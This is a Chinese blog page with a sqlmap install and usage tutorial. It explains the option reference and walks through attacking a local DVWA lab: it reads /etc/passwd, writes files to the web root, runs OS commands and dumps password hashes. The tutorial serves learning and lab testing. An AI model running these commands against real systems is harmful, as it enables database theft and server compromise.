<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SQLmap安装和使用 | WZ's Blog</title><meta name=keywords content><meta name=description content="SQLmap安装和使用 - WZ's Blog"><meta name=author content="nier"><link rel=canonical href=https://senmer.github.io/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/><link crossorigin=anonymous href=/assets/css/stylesheet.5a2b6d77cc78ad18bcb4914c5c639c7ce5ab55e956c461d4310747892b3f50c2.css integrity="sha256-Wittd8x4rRi8tJFMXGOcfOWrVelWxGHUMQdHiSs/UMI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://senmer.github.io/img/Q.gif><link rel=icon type=image/png sizes=16x16 href=https://senmer.github.io/img/Q.gif><link rel=icon type=image/png sizes=32x32 href=https://senmer.github.io/img/Q.gif><link rel=apple-touch-icon href=https://senmer.github.io/img/Q.gif><link rel=mask-icon href=https://senmer.github.io/img/Q.gif><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css><script src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<script src=https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js></script>
<script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><meta property="og:title" content="SQLmap安装和使用"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="https://senmer.github.io/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-26T21:17:29+08:00"><meta property="article:modified_time" content="2023-03-26T21:17:29+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SQLmap安装和使用"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"📚文章","item":"https://senmer.github.io/posts/"},{"@type":"ListItem","position":2,"name":"👨🏻‍💻 技术","item":"https://senmer.github.io/posts/tech/"},{"@type":"ListItem","position":3,"name":"SQLmap安装和使用","item":"https://senmer.github.io/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SQLmap安装和使用","name":"SQLmap安装和使用","description":"","keywords":[],"articleBody":"1 实验环境 软件名称 版本 部署方式 IP SQLmap latest 源码部署 172.31.5.7 DVWA latest docker run -d -p 80:80 –name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 2 SQLmap简介 官方网站：http://sqlmap.org/， 下载地址：https://github.com/sqlmapproject/sqlmap/zipball/master\nSqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。\nsqlmap支持的数据库有：\nMySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB sqlmap支持五种不同的注入模式：\n1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页 面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 2 下载及安装 2.1 Linux git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap cd sqlmap python sqlmap.py --update # 更新 python sqlmap.py -hh # 查看帮助信息 2.2 windows 官网下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。\n2.2. kali 默认安装（自带）\n┌──(root㉿kali)-[~] └─# sqlmap --version 1.6.11#stable 3 参数详解 3.1 Target：目标 -u URL, --url=URL 目标URL (e.g.\"http://www.site.com/vuln.php?id=1\")，使用-u或者--url -d DIRECT 直接连接数据库的连接字符串 -l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标 -x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标 -m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。 -g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理） -c CONFIGFILE 从配置ini文件中加载选项 -r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可 以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--forcessl参数来使用，或者可以在Host头后门加上:443 目标URL 参数：-u或者–url 格式：http(s)://targeturl[:port]/[…] 例如：python sqlmap.py -u “http://www.target.com/vuln.php?id=1\" -f –banner –dbs –users\n从文本中获取多个目标扫描\n参数：-m\n文件中保存url格式如下，sqlmap会一个一个检测\nwww.test1.com/vuln1.php?q=student www.test2.com/vuln2.asp?id=1 www.test3.com/vuln3/id/1* 从文件中加载HTTP请求\n参数：-r\nsqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。 比如文本文件内如下：\nPOST/students.php HTTP/1.1 Host:www.magedu.com User-Agent:Mozilla/4.0 id=1 当请求是HTTPS的时候，需要配合–force-ssl参数来使用，或者可以在Host头后面加上:443\n3.2 Request：请求设置 --method：指定请求方法 --data：把数据以POST方式提交 --param：当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数 --cookie：设置cookie，提交请求的时候附带所设置的cookie --load-cookies：从文件获取cookie --user-agent：可以使用–user-anget参数来修改 --headers：可以通过–headers参数来增加额外的http头 --proxy：设置代理，可以避免本机地址被封禁 --delay：可以设定两个HTTP(S)请求间的延迟 防止发送过快导致被封ip --random-agent：使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。 --referer：在请求目标的时候可以自己伪造请求包中的referer –-level参数设定为3或者3以上的时候会尝试对referer注入。 参数：–data\n此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数。\npython sqlmap.py -u \"http://www.magedu.com/students.php\" --data=\"id=1\" -f --banner --dbs --users 利用正则过滤目标网址\n参数：–scope\npython sqlmap.py -l burp_http.log --scope=\"(www)?\\.target\\.(com|net|org)\" 避免过多的错误请求被屏蔽\n参数：–safe-url,–safe-freq\n有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致后续无法进行测试。 绕过这个策略有两种方式：\n--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。 --safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。 3.3 Optimization：优化 -o 开启所有优化开关 3.4 Injection：注入 -p：设置想要测试的参数 --skip：不想要测试的参数可以通过 skip设置跳过 --dbms：指定数据库 节省sqlmap自己检测的时间 --os：指定数据库服务系统 节省sqlmap自己检测的时间 --tamper：使用sqlmap自带的tamper（脚本），或者自己写的tamper，来混淆payload，通常用来绕过waf和ips 测试参数\n参数：-p, –skip\nsqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。\n-p \"id,user-anget\" 当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。\n--skip=\"user-agent,referer\" 在有些时候web服务器使用了伪静态，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加* sqlmap将会测试value1的位置是否可注入。\npython sqlmap.py -u \"http://magedu/param1/value1*/param2/value2/\" 指定数据库服务器系统\n参数：–os 默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。\n3.5 Detection：探测等级 --level=LEVEL 执行测试的等级（1-5，默认为1） --risk：（*慎用此参数有风险）， 共有四个风险等级（0-3），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 探测等级\n参数：–level 共有五个等级，默认为1，最大为5，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。\n这个参数不仅影响使用哪些payload，同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-gent/Referer头在level为3的时候就会测试。\n总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。\n**风险等级 **\n参数：–risk\n共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。\n在有些时候，例如在UPDATE/DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。\n测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。\n3.6 Enumeration：枚举数据 -a, --all 获取所有信息 -b, --banner 获取数据库管理系统的标识 --current-user 获取数据库管理系统当前用户 --current-db 获取数据库管理系统当前数据库 --hostname 获取数据库服务器的主机名称 --is-dba 检测DBMS当前用户是否DBA（数据库管理员） --users 枚举数据库管理系统用户 --passwords 枚举数据库管理系统用户密码哈希 --privileges 枚举数据库管理系统用户的权限 --roles 枚举数据库管理系统用户的角色 --dbs 枚举数据库管理系统数据库 --tables 枚举的DBMS数据库中的表 --columns 枚举DBMS数据库表列 --schema 枚举数据库架构 --count 检索表的项目数 --dump 转储数据库表项，即下载 --dump-all 转储数据库所有表项 --search 搜索列（S），表（S）和/或数据库名称（S） --comments 获取DBMS注释 -D DB 要进行枚举的指定数据库名 -T TBL DBMS数据库表枚举 -C COL DBMS数据库表列枚举 -X EXCLUDECOL DBMS数据库表不进行枚举 -U USER 用来进行枚举的数据库用户 --exclude-sysdbs 枚举表时排除系统数据库 --pivot-column=P.. Pivot columnname --where=DUMPWHERE Use WHEREcondition while table dumping --start=LIMITSTART 获取第一个查询输出数据位置 --stop=LIMITSTOP 获取最后查询的输出数据 --first=FIRSTCHAR 第一个查询输出字的字符获取 --last=LASTCHAR 最后查询的输出字字符获取 --sql-query=QUERY 要执行的SQL语句 --sql-shell 提示交互式SQL的shell --sql-file=SQLFILE 要执行的SQL文件 标志 参数：-b,–banner 大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量 @@version，这主要取决于是什么数据库。\n当前用户 参数：-current-user 在大多数据库中可以获取到管理数据的用户。\n当前数据库 参数：–current-db 返还当前连接的数据库。\n当前用户是否为管理员 参数：–is-dba 判断当前的用户是否为管理员，是的话会返回True。\n列出数据库管理用户\n参数：–users\n当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。\n列出并破解数据库用户的hash 参数：–passwords 当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。\npython sqlmap.py -u \"http://magedu/sqlmap/pgsql/students.php?id=1\" --passwords - v1 列出数据库管理员权限 参数：–privileges 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你 哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。\n列出数据库管理员角色 参数：–roles 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。仅适用于当前数据库是Oracle的时候。\n列出数据库系统的数据库 参数：–dbs 当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。\n列举数据库表 参数：–tables,–exclude-sysdbs,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。 如果你不提供-D参数来指定一个数据库的时候，sqlmap会列出数据库所有库的所有表。 –exclude-sysdbs参数是指可排除系统数据库。 需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。\n列举数据库表中的字段 参数：–columns,-C,-T,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。 如果没有使用-D参数指定数据库时，默认会使用当前数据库。\n3.7 Brute force：爆破 --common-tables 检查存在共同表 --common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： --udf-inject 注入用户自定义函数 --shared-lib=SHLIB 共享库的本地路径 3.8 File system access：访问文件系统 --file-read=RFILE 从后端的数据库管理系统读取文件 --file-write=WFILE 上传文件到后端的数据库管理系统 --file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 从数据库服务器中读取文件 参数：–file-read 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。\npython sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --file-read \"/etc/passwd\" **把文件上传到数据库服务器中 **\n参数：–file-write,–file-dest 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。\npython sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --file-write=\"/opt/test_code/user.txt\" --filedest=\"/var/www/html/user.txt\" 3.9 Operating system access：访问操作系统 --os-cmd=OSCMD 执行操作系统命令 --os-shell 交互式的操作系统的shell --os-pwn 获取一个OOB shell，meterpreter或VNC --os-smbrelay 一键获取一个OOB shell，meterpreter或VNC --os-bof 存储过程缓冲区溢出利用 --priv-esc 数据库进程用户权限提升 --msf-path=MSFPATH Metasploit Framework 本地的安装路径 --tmp-path=TMPPATH 远程临时文件目录的绝对路径 获取整个表的数据 参数：–dump,-C,-T,-D,–start,–stop,–first,–last 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。\npython sqlmap.py -u \"http://magedu/sqlmap/firebird/students.php?id=1\" --dump -T users 可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。也可以用-dump跟-C获取指定的字段内容。\nsqlmap为每个表生成了一个CSV文件。\n如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可以使用–stop1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。 也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中第三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。\n获取所有数据库表的内容 参数：–dump-all,–exclude-sysdbs 使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据。\n搜索字段，表，数据库 参数：–search,-C,-T,-D –search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。 可以在以下三种情况下使用：\n-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。 -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名 -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。 运行自定义的SQL语句 参数：–sql-query,–sql-shell sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。 如果是SELECT查询语句，sqlmap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。\n$python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --sql-query \"SELECT 'magedu'\" -v1 运行任意操作系统命令 参数：–os-cmd,–os-shell\npython sqlmap.py -u \"127.0.0.1:8080/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" - -cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --os-cmd id 用–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。 当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：\n1、ASP 2、ASP.NET 3、JSP 4、PHP 爬行网站URL 参数：–crawl sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。此时的URL可以不带参数。\npython sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --batch --crawl=3 python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --batch --crawl=3 定义dump数据的格式 参数：–dump-format 输出的格式可定义为：CSV，HTML，SQLITE\n自定义输出的路径 参数：–output-dir sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：–output-dir=/tmp\n4 实际利用(dvwa) 当给sqlmap这么一个url的时候，它会：\n1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，读取哪些数据 如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数\n0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 如果你想看到sqlmap发送的测试payload最好的等级就是3。\n# 判断注入点，因系统需要登录所以要加 cookie python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -p id --batch # 检测站点包含哪些数据库 python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -p id --dbs --batch 技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断\n可以看到有四个数据库，选择dvwa数据库获取其中的表名\npython sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa --tables --batch 可以看到，dvwa里面有两张表，分别是guestbook，users。选择users表获取表中的字段\npython sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa -T users --columns 可以看到里面有password，直接获取我们想要的内容 (账号/密码)\npython sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa -T users -C last_name,password --dump --batch ","wordCount":"7023","inLanguage":"zh","datePublished":"2023-03-26T21:17:29+08:00","dateModified":"2023-03-26T21:17:29+08:00","author":{"@type":"Person","name":"nier"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://senmer.github.io/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},"publisher":{"@type":"Organization","name":"WZ's Blog","logo":{"@type":"ImageObject","url":"https://senmer.github.io/img/Q.gif"}}}</script></head><body id=top><script>(function(){let e,t=new RegExp("(^| )change-themes=([^;]*)(;|$)");(e=document.cookie.match(t))||((new Date).getHours()>=19||(new Date).getHours()<6?(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark")):(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")))})(),localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?4d7c4710a089d70b71310f0e1ec7681b",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><a href=https://senmer.github.io/ accesskey=h title="WZ's Blog (Alt + H)"><img src=https://senmer.github.io/img/Q.gif alt=logo aria-label=logo height=35>WZ's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://senmer.github.io/search title="🔍 搜索 (Alt + /)" accesskey=/><span>🔍 搜索</span></a></li><li><a href=https://senmer.github.io/ title="🏠 主页"><span>🏠 主页</span></a></li><li><a href=https://senmer.github.io/posts/tech title="📚 文章"><span>📚 文章</span></a></li><li><a href=https://senmer.github.io/categories/ title="🧩 分类"><span>🧩 分类</span></a></li><li><a href=https://senmer.github.io/archives/ title="⏱️ 时间轴"><span>⏱️ 时间轴</span></a></li><li><a href=https://senmer.github.io/about title="🙋🏻‍♂️ 关于"><span>🙋🏻‍♂️ 关于</span></a></li><li><a href=https://senmer.github.io/links title="🤝 友链"><span>🤝 友链</span></a></li></ul></nav></header><main class="main page"><style>i[id*=post_meta_style]{display:flex;align-items:center;margin:0 0 10px}</style><article class=post-single><div id=single-content><header class=post-header><div class=breadcrumbs><a href=https://senmer.github.io/>🏠 主页</a>&nbsp;»&nbsp;<a href=https://senmer.github.io/posts/>📚文章</a>&nbsp;»&nbsp;<a href=https://senmer.github.io/posts/tech/>👨🏻‍💻 技术</a></div><h1 class=post-title>SQLmap安装和使用</h1><div class=post-meta><style>i[id*=post_meta_style]{display:flex;align-items:center;margin:0 0 10px}.parent-post-meta{display:flex;flex-wrap:wrap;opacity:.8}</style><span class=parent-post-meta><span id=post_meta_style_1><span class="fa fa-calendar-check-o"></span>
<span>2023-03-26
&nbsp;&nbsp;</span></span>
<span id=post_meta_style_3><span class="fa fa-file-word-o"></span>
<span>7023字
&nbsp;&nbsp;</span></span>
<span id=post_meta_style_4><span class="fa fa-clock-o"></span>
<span>15分钟
&nbsp;&nbsp;</span></span>
<span id=post_meta_style_5><span class="fa fa-user-o"></span>
<span>nier
&nbsp;&nbsp;</span></span>
<span id=post_meta_style_6><span class="fa fa-tags" style=opacity:.8></span>
<span></span></span></span><span style=opacity:.8><span id=post_meta_style_7>&nbsp;&nbsp;
<span class="fa fa-eye"></span>
<span><span id=busuanzi_container_page_pv><span id=busuanzi_value_page_pv></span></span>
&nbsp;&nbsp;</span></span>
<span id=post_meta_style_8><span class="fa fa-commenting-o"></span>
<span><script src=https://cdn.staticfile.org/twikoo/1.6.16/twikoo.all.min.js></script>
<script>let url=document.documentURI,dnsUrl="https://senmer.github.io/",urlSplit=url.split(dnsUrl),finalUrl=urlSplit[1];finalUrl[0]!=="/"&&(finalUrl="/"+finalUrl),twikoo.getCommentsCount({envId:"https://hugo-api-khaki.vercel.app/# 填写自己的twikoo id",region:null,urls:[finalUrl],includeReply:!1}).then(function(e){let t=e[0].count;const n=document.getElementById("comment_count");n.innerText=t}).catch(function(e){console.error(e)})</script><span id=comment_count></span></span></span></span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#1-%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83 aria-label="1 实验环境">1 实验环境</a></li><li><a href=#2-sqlmap%e7%ae%80%e4%bb%8b aria-label="2 SQLmap简介">2 SQLmap简介</a></li><li><a href=#2-%e4%b8%8b%e8%bd%bd%e5%8f%8a%e5%ae%89%e8%a3%85 aria-label="2 下载及安装">2 下载及安装</a><ul><li><a href=#21-linux aria-label="2.1 Linux">2.1 Linux</a></li><li><a href=#22-windows aria-label="2.2 windows">2.2 windows</a></li><li><a href=#22-kali aria-label="2.2. kali">2.2. kali</a></li></ul></li><li><a href=#3-%e5%8f%82%e6%95%b0%e8%af%a6%e8%a7%a3 aria-label="3 参数详解">3 参数详解</a><ul><li><a href=#31-target%e7%9b%ae%e6%a0%87 aria-label="3.1 Target：目标">3.1 Target：目标</a></li><li><a href=#32-request%e8%af%b7%e6%b1%82%e8%ae%be%e7%bd%ae aria-label="3.2 Request：请求设置">3.2 Request：请求设置</a></li><li><a href=#33-optimization%e4%bc%98%e5%8c%96 aria-label="3.3 Optimization：优化">3.3 Optimization：优化</a></li><li><a href=#34-injection%e6%b3%a8%e5%85%a5 aria-label="3.4 Injection：注入">3.4 Injection：注入</a></li><li><a href=#35-detection%e6%8e%a2%e6%b5%8b%e7%ad%89%e7%ba%a7 aria-label="3.5 Detection：探测等级">3.5 Detection：探测等级</a></li><li><a href=#36-enumeration%e6%9e%9a%e4%b8%be%e6%95%b0%e6%8d%ae aria-label="3.6 Enumeration：枚举数据">3.6 Enumeration：枚举数据</a></li><li><a href=#37-brute-force%e7%88%86%e7%a0%b4 aria-label="3.7 Brute force：爆破">3.7 Brute force：爆破</a></li><li><a href=#38-file-system-access%e8%ae%bf%e9%97%ae%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f aria-label="3.8 File system access：访问文件系统">3.8 File system access：访问文件系统</a></li><li><a href=#39-operating-system-access%e8%ae%bf%e9%97%ae%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f aria-label="3.9 Operating system access：访问操作系统">3.9 Operating system access：访问操作系统</a></li></ul></li><li><a href=#4-%e5%ae%9e%e9%99%85%e5%88%a9%e7%94%a8dvwa aria-label="4 实际利用(dvwa)">4 实际利用(dvwa)</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=1-实验环境>1 实验环境<a hidden class=anchor aria-hidden=true href=#1-实验环境>#</a></h2><table><thead><tr><th>软件名称</th><th>版本</th><th>部署方式</th><th>IP</th></tr></thead><tbody><tr><td>SQLmap</td><td>latest</td><td>源码部署</td><td>172.31.5.7</td></tr><tr><td>DVWA</td><td>latest</td><td>docker run -d -p 80:80 &ndash;name dvwa docker.io/sagikazarmark/dvwa</td><td>172.31.5.7</td></tr></tbody></table><h2 id=2-sqlmap简介>2 SQLmap简介<a hidden class=anchor aria-hidden=true href=#2-sqlmap简介>#</a></h2><blockquote><p>官方网站：http://sqlmap.org/，
